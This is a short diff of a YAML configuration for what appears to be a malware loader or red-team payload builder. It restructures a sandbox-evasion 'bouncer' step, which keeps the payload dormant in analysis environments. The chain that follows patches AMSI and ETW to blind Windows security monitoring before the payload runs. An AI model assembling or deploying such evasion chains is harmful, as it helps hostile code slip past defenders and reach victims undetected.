@@ -64,7 +64,11 @@ build:
 # One ordered chain: preparations run first, then the payload.
 runtime:
   - technique: bouncer                   # stay dormant off-target / in a sandbox
-    params: { not_in_sandbox: true, min_ram_mb: 2048, on_fail: silent }
+    params:
+      require:
+        - ram_mb: 2048
+      anti_analysis:
+        sandbox: true
 
   - technique: patch_amsi                # neutralize AMSI in the loader's process
   - technique: patch_etw                 # and ETW, before anything runs
